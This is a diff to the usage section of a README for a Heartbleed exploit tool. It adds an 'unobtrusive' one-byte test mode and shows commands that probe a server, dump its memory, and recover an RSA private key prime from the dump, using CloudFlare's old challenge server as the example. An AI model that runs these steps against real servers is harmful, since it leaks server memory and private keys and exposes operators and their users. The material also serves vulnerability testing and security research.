@@ -25,22 +25,30 @@ Here seen recovering one of the RSA primes of the CloudFlare challenge 34 times 
 ![img](https://i.imgur.com/zfEBObE.png)
 
 ```
-# Test vulnerability
-$ ./hb.py -p 4433 localhost
-localhost:4433 is vulnerable
+# Test vulnerability using unobtrusive mode
+# This will request N bytes, but supply N-1 itself, so that the server will
+# only actually bleed a single byte if vulnerable. Suggested N is 16360 in this
+# case, since that will result in a single TLS record: 
+# 3 + 2 + 1 + 2 + 16360 + 16 bytes = 0xFFFF.
+
+$ ./hb.py -u -n 16360 -p 443 www.example.int
+www.example.int:443 is vulnerable
 
 # Dupm data from CloudFlare's old challenge server
+
 $ ./hb.py -p 443 www.cloudflarechallenge.com -n 0xF000 -l 100 -t 50 -d -o cloudflare-dump.bin
 [2014/04/14 10:55:48] Incoming data rate: 85877 kbps
 ... runs for a while
 
 # Look for prime in the dump
+
 $ ./keyscan.py cloudflare.crt cloudflare-dump.bin
 Key size: 128
 Data length: 173476834
 cloudflare-dump.bin Offset 0xf155ec: p = 13827796798740740191625032142481917804987720337701...
 
 # Extract key once found
+
 $ ./keyscan.py cloudflare.crt cloudflare-dump.bin 0xf155ec
 Prime should be at offset: f155ec
 Key size: 128
